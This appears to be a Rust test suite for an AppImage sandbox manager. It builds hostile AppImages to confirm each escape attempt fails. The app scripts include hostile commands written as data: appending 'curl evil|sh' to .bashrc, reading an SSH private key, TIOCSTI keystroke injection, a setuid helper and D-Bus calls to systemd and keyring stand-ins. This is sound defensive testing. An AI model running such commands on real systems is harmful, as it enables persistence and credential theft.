//! The evil-AppImage suite: deliberately hostile AppImages, each trying one
//! escape, go through SAM's normal path (added like any AppImage, started
//! with the settings SAM recommends) and every attempt must fail. Writes are
//! judged on the host afterwards, not by what the app reports.
//!
//! Desktop services: the suite starts its own D-Bus session in a temporary
//! folder (without service files, so nothing starts by itself) and a small
//! host program owns stand-ins for dangerous services there. A control app
//! first proves that an allowed service is reachable through SAM's proxy, so
//! "blocked" results cannot come from a broken setup.
//!
//! Uses a fake $HOME; skipped when Bubblewrap, sam-jail-run, python3 with
//! GObject (gi), gdbus or dbus-daemon is missing.
#![allow(clippy::unwrap_used, clippy::panic)] // a test: a panic is a failed test

use std::collections::HashMap;
use std::fs;
use std::io::{BufRead, BufReader};
use std::net::TcpListener;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};

use sam_core::{HostInfo, Paths};
use sam_intake::testkit::{build, FixtureFile, FixtureSpec};
use sam_runner::launch::{run, LaunchOptions};
use sam_runner::ops::{AddOptions, Sam};

fn have(tool: &str) -> bool {
    // SAM's helper is the one of this build (find_helper), as for SAM's own
    // starts; looking only on PATH made this test fail in every run without
    // PATH set up, which in a mutation run counts every change as caught.
    if tool == "sam-jail-run" {
        return sam_runner::find_helper().is_some();
    }
    std::env::var_os("PATH")
        .is_some_and(|p| std::env::split_paths(&p).any(|d| d.join(tool).is_file()))
}

fn usable() -> bool {
    let host = HostInfo::probe();
    sam_runner::bwrap::check(&host).is_ok()
        && ["sam-jail-run", "python3", "gdbus", "dbus-daemon"].iter().all(|t| have(t))
        // The stand-in services on the host use GObject's D-Bus support.
        && Command::new("python3").args(["-c", "from gi.repository import Gio"]).stderr(Stdio::null()).status().is_ok_and(|s| s.success())
}

/// A private session bus plus a host program that owns stand-in names.
struct Bus {
    address: String,
    socket: PathBuf,
    daemon: Child,
    owner: Child,
}

impl Drop for Bus {
    fn drop(&mut self) {
        let _ = self.owner.kill();
        let _ = self.daemon.kill();
    }
}

const OWNER_PY: &str = r#"
import sys
from gi.repository import Gio, GLib
conn = Gio.DBusConnection.new_for_address_sync(sys.argv[1],
    Gio.DBusConnectionFlags.AUTHENTICATION_CLIENT | Gio.DBusConnectionFlags.MESSAGE_BUS_CONNECTION, None, None)
for n in sys.argv[2:]:
    conn.call_sync("org.freedesktop.DBus", "/org/freedesktop/DBus", "org.freedesktop.DBus", "RequestName",
                   GLib.Variant("(su)", (n, 4)), None, 0, 5000, None)
print("READY", flush=True)
GLib.MainLoop().run()
"#;

fn start_bus(dir: &Path) -> Bus {
    let services = dir.join("no-services");
    fs::create_dir_all(&services).unwrap();
    let socket = dir.join("bus");
    let conf = dir.join("bus.conf");
    fs::write(
        &conf,
        format!(
            r#"<!DOCTYPE busconfig PUBLIC "-//freedesktop//DTD D-Bus Bus Configuration 1.0//EN" "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
<busconfig><type>session</type><listen>unix:path={}</listen><servicedir>{}</servicedir>
<policy context="default"><allow send_destination="*" eavesdrop="true"/><allow eavesdrop="true"/><allow own="*"/></policy></busconfig>"#,
            socket.display(),
            services.display()
        ),
    )
    .unwrap();
    let daemon = Command::new("dbus-daemon")
        .arg(format!("--config-file={}", conf.display()))
        .arg("--nofork")
        .stdout(Stdio::null())
        .spawn()
        .unwrap();
    for _ in 0..50 {
        if socket.exists() {
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(50));
    }
    let address = format!("unix:path={}", socket.display());
    let script = dir.join("owner.py");
    fs::write(&script, OWNER_PY).unwrap();
    // Stand-ins: an allowed service (the control) and dangerous ones.
    let mut owner = Command::new("python3")
        .arg(&script)
        .arg(&address)
        .args([
            "org.freedesktop.Notifications",
            "org.freedesktop.systemd1",
            "org.freedesktop.portal.Flatpak",
            "org.freedesktop.secrets",
            "org.kde.klauncher5",
        ])
        .stdout(Stdio::piped())
        .spawn()
        .unwrap();
    let mut line = String::new();
    BufReader::new(owner.stdout.take().unwrap())
        .read_line(&mut line)
        .unwrap();
    assert_eq!(line.trim(), "READY", "the stand-in services did not start");
    Bus {
        address,
        socket,
        daemon,
        owner,
    }
}

/// One hostile app: its start script, and extra files or links in its image.
struct Evil {
    name: &'static str,
    script: String,
    files: Vec<FixtureFile>,
    links: Vec<(String, String)>,
}

fn evil(name: &'static str, script: impl Into<String>) -> Evil {
    Evil {
        name,
        script: script.into(),
        files: Vec::new(),
        links: Vec::new(),
    }
}

/// Every hostile AppImage, added and started like any other, fails to get
/// out of its sandbox: it cannot read keys, SAM's settings or another app's
/// files; cannot write autostart entries, shell startup files or host
/// temporary files; cannot type into the terminal, reach the network when it
/// has none, see host processes or change its own app folder; cannot reach
/// systemd, the Flatpak spawn portal, the keyring or a launcher service, nor
/// take over a portal's name on the desktop bus; and a symlink or setuid bit
/// in its image gains it nothing.
#[test]
fn every_hostile_appimage_fails_to_escape() {
    if !usable() {
        sam_runner::contracts::skip("bubblewrap, sam-jail-run, python3 with GObject (gi), gdbus or dbus-daemon not available").unwrap_or_else(|e| panic!("{e}"));
        return;
    }
    // The outside world this test relies on (docs/contracts.md).
    let _contracts =
        sam_runner::contracts::guard(&["bwrap-core", "dbus-proxy-filter", "kernel-seccomp"])
            .unwrap_or_else(|e| panic!("{e}"));
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    let home = root.join("home/tester");
    for d in [".ssh", ".config/autostart", ".config/sam"] {
        fs::create_dir_all(home.join(d)).unwrap();
    }
    fs::write(home.join(".ssh/id_ed25519"), "PRIVATE-KEY").unwrap();
    fs::write(home.join(".bashrc"), "# bashrc\n").unwrap();
    std::env::set_var("HOME", &home);
    std::env::set_var("XDG_CONFIG_HOME", home.join(".config"));
    std::env::set_var("XDG_DATA_HOME", home.join(".local/share"));
    let sam_root = root.join("sam");
    let sam = Sam::with_paths(Paths::rooted(&sam_root)).unwrap();
    fs::create_dir_all(sam.paths.config_dir.clone()).unwrap();
    fs::write(sam.paths.config_file(), "# SAM settings\n").unwrap();
    // Another app's private home with a secret.
    let other = sam.paths.app_home("appimage-other-1");
    fs::create_dir_all(&other).unwrap();
    fs::write(other.join("secret"), "OTHER-APP-SECRET").unwrap();

    let bus = start_bus(root);
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    listener.set_nonblocking(true).unwrap();
    let port = listener.local_addr().unwrap().port();
    let token = std::process::id();
    let h = home.display().to_string();
    let ping = |dest: &str| {
        format!("gdbus call --timeout 5 --session --dest {dest} --object-path / --method org.freedesktop.DBus.Peer.Ping >/dev/null 2>&1 && echo RESULT=escaped || echo RESULT=blocked")
    };
    let mut apps = vec![
        // The control: an allowed service must be reachable.
        evil("Control", ping("org.freedesktop.Notifications").replace("escaped", "reached")),
        evil("ReadKey", format!("cat {h}/.ssh/id_ed25519 2>/dev/null && echo RESULT=escaped || echo RESULT=blocked")),
        evil("ReadSamSettings", format!("cat {} 2>/dev/null && echo RESULT=escaped || echo RESULT=blocked", sam.paths.config_file().display())),
        evil("ReadOtherApp", format!("cat {}/secret 2>/dev/null && echo RESULT=escaped || echo RESULT=blocked", other.display())),
        evil("WriteAutostart", format!("echo x > {h}/.config/autostart/evil.desktop 2>/dev/null; echo RESULT=tried")),
        evil("WriteBashrc", format!("echo 'curl evil|sh' >> {h}/.bashrc 2>/dev/null; echo RESULT=tried")),
        evil("WriteHostTmp", format!("echo x > /tmp/sam-evil-{token} 2>/dev/null; echo RESULT=tried")),
        evil(
            "TypeIntoTerminal",
            "python3 -c 'import fcntl,termios,sys\ntry:\n fcntl.ioctl(0, termios.TIOCSTI, b\"x\"); print(\"RESULT=escaped\")\nexcept OSError as e:\n print(\"RESULT=blocked:\" + str(e.errno))'",
        ),
        evil(
            "NetworkWhenOff",
            format!("python3 -c 'import socket\ns=socket.socket()\ns.settimeout(2)\ntry:\n s.connect((\"127.0.0.1\", {port})); print(\"RESULT=escaped\")\nexcept OSError as e:\n print(\"RESULT=blocked:\" + str(e))'"),
        ),
        evil("SeeHostProcess", format!("kill -0 {token} 2>/dev/null && echo RESULT=escaped || echo RESULT=blocked")),
        evil("ChangeOwnApp", "echo x > \"$APPDIR/usr/bin/evil\" 2>/dev/null && echo RESULT=escaped || echo RESULT=blocked"),
        evil("Systemd", ping("org.freedesktop.systemd1")),
        evil("FlatpakSpawn", ping("org.freedesktop.portal.Flatpak")),
        evil("Keyring", ping("org.freedesktop.secrets")),
        evil("Launcher", ping("org.kde.klauncher5")),
        evil(
            "ImpersonatePortal",
            "gdbus call --timeout 5 --session --dest org.freedesktop.DBus --object-path /org/freedesktop/DBus --method org.freedesktop.DBus.RequestName org.freedesktop.portal.Desktop 4 2>/dev/null | grep -q '(uint32 1,)' && echo RESULT=escaped || echo RESULT=blocked",
        ),
        evil("InputDevices", "ls /dev/input/event* >/dev/null 2>&1 && echo RESULT=escaped || echo RESULT=blocked"),
    ];
    let mut link = evil(
        "SymlinkToKey",
        "cat \"$APPDIR/usr/share/key\" 2>/dev/null && echo RESULT=escaped || echo RESULT=blocked",
    );
    link.links
        .push(("usr/share/key".into(), format!("{h}/.ssh/id_ed25519")));
    apps.push(link);
    let mut suid = evil("SetuidInImage", "case $(stat -c %a \"$APPDIR/usr/bin/helper\") in 4*|2*) echo RESULT=escaped;; *) echo RESULT=blocked;; esac");
    suid.files.push(FixtureFile {
        path: "usr/bin/helper".into(),
        data: b"#!/bin/sh\n".to_vec(),
        mode: 0o4755,
    });
    apps.push(suid);

    let mut host = HostInfo::probe();
    // The same run on every computer: not the person's display or session bus.
    host = sam_runner::testenv::test_host(host);
    host.sockets.dbus_session_address = Some(bus.address.clone());
    host.sockets.dbus_session = Some(bus.socket.clone());
    let mut results: HashMap<&str, String> = HashMap::new();
    for app in apps {
        let img = root.join(format!("{}.AppImage", app.name));
        let mut spec = FixtureSpec::hello(app.name);
        spec.apprun = format!("#!/bin/sh\n{}\n", app.script);
        spec.host_binary = None;
        spec.files.extend(app.files);
        spec.symlinks.extend(app.links);
        build(&img, &spec).unwrap();
        // The normal path: added like any AppImage, SAM's recommendation.
        let id = sam
            .add(
                &img,
                &AddOptions {
                    launcher: Some(false),
                    accept: true,
                    ..Default::default()
                },
            )
            .unwrap()
            .entry
            .id;
        let mut e = sam.resolve(&id).unwrap();
        let started = std::time::Instant::now();
        let rec = run(
            &mut e,
            &LaunchOptions {
                quiet: true,
                timeout_secs: Some(30),
                ..Default::default()
            },
            &sam.config,
            &sam.paths,
            &host,
        )
        .unwrap();
        let took = started.elapsed().as_secs_f64();
        let log = fs::read_to_string(rec.log_file.unwrap()).unwrap();
        let r = log
            .lines()
            .filter_map(|l| l.strip_prefix("RESULT="))
            .next_back()
            .unwrap_or("no result")
            .to_string();
        eprintln!("evil: {:<18} {:>4.1} s  {r}", app.name, took);
        results.insert(app.name, r);
    }
    drop(bus);

    assert_eq!(
        results["Control"], "reached",
        "the allowed service must be reachable, or the D-Bus results mean nothing"
    );
    let mut escaped: Vec<String> = results
        .iter()
        .filter(|(n, r)| {
            **n != "Control" && (r.starts_with("escaped") || r.as_str() == "no result")
        })
        .map(|(n, r)| format!("{n}: {r}"))
        .collect();
    // Writes: judged on the host.
    if home.join(".config/autostart/evil.desktop").exists() {
        escaped.push("WriteAutostart: the autostart entry exists".into());
    }
    if fs::read_to_string(home.join(".bashrc")).unwrap() != "# bashrc\n" {
        escaped.push("WriteBashrc: .bashrc changed".into());
    }
    let host_tmp = PathBuf::from(format!("/tmp/sam-evil-{token}"));
    if host_tmp.exists() {
        let _ = fs::remove_file(&host_tmp);
        escaped.push("WriteHostTmp: the file is in the host's /tmp".into());
    }
    if listener.accept().is_ok() {
        escaped.push("NetworkWhenOff: the host listener got a connection".into());
    }
    let unpacked_suid = fs::read_dir(sam.paths.default_extracted_dir())
        .unwrap()
        .flatten()
        .filter_map(|d| fs::metadata(d.path().join("AppDir/usr/bin/helper")).ok())
        .any(|m| m.permissions().mode() & 0o6000 != 0);
    if unpacked_suid {
        escaped.push("SetuidInImage: the unpacked helper kept its setuid bit".into());
    }
    assert!(
        escaped.is_empty(),
        "hostile AppImages escaped:\n{}\nall results: {results:#?}",
        escaped.join("\n")
    );
}
